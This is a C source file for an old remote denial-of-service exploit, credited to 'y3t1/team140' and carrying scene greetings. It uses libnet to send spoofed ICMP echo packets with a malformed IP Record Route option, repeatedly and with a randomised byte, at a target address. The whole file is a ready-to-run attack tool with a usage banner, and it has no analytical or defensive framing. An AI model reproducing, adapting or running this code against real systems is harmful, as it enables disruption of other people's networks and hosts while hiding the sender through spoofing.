#include <stdio.h>
#include <libnet.h>
/* Remote denial-of-service in IP stack 
   simple exploit by y3t1
                     y3t1@rast.lodz.pdi.net

Gretzzz : rastlin,z33d,vanitas,DYZIU,Kuki,vx,zx,korie,kaneda,
          d3cker&mroowka,jarv33s,funkySh,Shadow,tmoggie
	  all from :
	           #hwa.hax0r.news@efnet
	           #darnet@efnet
*/
int rand_n(u_long zakres)
{
  return 1+(int) ((float)zakres*rand()/(RAND_MAX+1.0));
}

int main(int argc, char **argv)
{
    char a;
    int sock, c,pkt,ile;
    struct hostent *host;
    u_long src_ip, dst_ip;
    u_char *buf;
    u_char options[4];
    int option_s  = sizeof(options);
    struct ipoption ipopt;
    srand(time(NULL));
    ile=100; 
    printf("  -= Remote denial-of-service in IP stack =- \n");
    printf("\n");
    printf("                          by y3t1/team140\n");
    printf("                             y3t1@rast.lodz.pdi.net \n");
    printf("\n");
    if  (argc < 4) 
    {
     printf("%s -s src_addr -d dst_addr -p packets\n",argv[0]);
     printf(" -s src_addr - source address \n");
     printf(" -d dst_addr - dest address \n");
     printf(" -p packets - how many packets send to dest (default 100)\n");
     exit(1);
    }
   opterr=0;
   while((a=getopt(argc,argv,"s:d:p:"))!=EOF)
   {
	switch(a) {
	 case 's': { 
	           if ((host=gethostbyname(optarg))!=NULL)
		   bcopy(host->h_addr,&src_ip,host->h_length);
		   else src_ip=inet_addr(optarg);
		   break;
		   }
	 case 'd': {   
	           if ((host=gethostbyname(optarg))!=NULL)
		   bcopy(host->h_addr,&dst_ip,host->h_length);
		   else dst_ip=inet_addr(optarg);
	      	   break;
                   }
         case 'p': {
	            ile=atoi(optarg);
		    break; 
		   }
	 }
   }
    bzero(options,option_s);
    buf = malloc(IP_MAXPACKET);
    if (!buf)
    {
        perror("malloc");
        exit(-1);
    }
    sock = libnet_open_raw_sock(IPPROTO_RAW);
    if (sock == -1)
    {
        perror("socket");
        exit(-1);
    }
    libnet_build_ip(LIBNET_ICMP_H ,0,242,0,48,IPPROTO_ICMP,src_ip,dst_ip,NULL,0,buf);                          
    memcpy(ipopt.ipopt_list, options, option_s);
    *(ipopt.ipopt_list)     = IPOPT_RR;
    *(ipopt.ipopt_list+1)   = 3;
    *(ipopt.ipopt_list+2)   = 0xff;
    *(ipopt.ipopt_list+3)   = 0;
    c = libnet_insert_ipo(&ipopt,option_s,buf);                                                
    if (c == -1)
    {
        printf("Error\n");
	exit(1);
    }
    libnet_build_icmp_echo(ICMP_ECHO,0,242,31337,NULL,0,buf+LIBNET_IP_H+option_s);
    if (libnet_do_checksum(buf,IPPROTO_ICMP,LIBNET_ICMP_ECHO_H)==-1)
    {
     printf("can't do checksum \n");
    }
 for (pkt=0;pkt<ile;pkt++)
 {
    buf[22]=rand_n(0xff);
    c = libnet_write_ip(sock, buf, LIBNET_ICMP_ECHO_H + LIBNET_IP_H + option_s);
 }
    free(buf);
    libnet_close_raw_sock(sock);   
}

